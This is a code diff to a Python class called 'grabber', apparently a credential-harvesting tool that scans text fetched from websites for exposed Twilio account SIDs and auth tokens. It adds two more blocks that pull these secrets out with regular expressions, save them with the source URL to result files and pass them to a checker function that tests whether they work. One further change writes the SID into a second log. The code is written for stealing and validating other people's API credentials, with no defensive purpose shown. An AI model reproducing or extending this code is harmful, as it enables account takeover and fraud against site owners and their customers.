@@ -1635,6 +1635,54 @@ class grabber:
                           objek += 1
                     except:
                      pass
+            if 'TWILIO_SID=' in teks:
+                try:
+                    sid = re.findall('TWILIO_SID=(.*?)\n', teks)[0]
+                    if '\r' in sid:
+                        sid = sid.replace('\r', '')
+                    token = re.findall('TWILIO_AUTH_TOKEN=(.*?)\n', teks)[0]
+                    if '\r' in token:
+                        token = token.replace('\r', '')
+                    if sid == '' or sid == 'null' or sid == '""':
+                        pass
+                    else:
+                        pack = clean(urlku + '|' + sid + '|' + token)
+                        with open('Result/twilio.txt', 'a') as epep:
+                            epep.write(pack + '\n')
+                        ceker_twilio(urlku, sid, token)
+                        objek += 1
+                except:
+                    try:
+                     if '=AC' in teks:
+                      with open('Result/tw.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
+            if 'TWILIOACCOUNTSID=' in teks:
+                try:
+                    sid = re.findall('TWILIOACCOUNTSID=(.*?)\n', teks)[0]
+                    if '\r' in sid:
+                        sid = sid.replace('\r', '')
+                    token = re.findall('TWILIOACCOUNTTOKEN=(.*?)\n', teks)[0]
+                    if '\r' in token:
+                        token = token.replace('\r', '')
+                    if sid == '' or sid == 'null' or sid == '""':
+                        pass
+                    else:
+                        pack = clean(urlku + '|' + sid + '|' + token)
+                        with open('Result/twilio.txt', 'a') as epep:
+                            epep.write(pack + '\n')
+                        ceker_twilio(urlku, sid, token)
+                        objek += 1
+                except:
+                    try:
+                     if '=AC' in teks:
+                      with open('Result/tw.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
             
             if 'TWILIO_ACCOUNTSID=' in teks:
                 try:
@@ -1680,7 +1728,7 @@ class grabber:
                     try:
                      if '=AC' in teks:
                       with open('Result/tw.txt', 'a') as epep:
-                          epep.write(urlku + '\n')
+                          epep.write(urlku + "- " + sid + '\n')
                           objek += 1
                     except:
                      pass
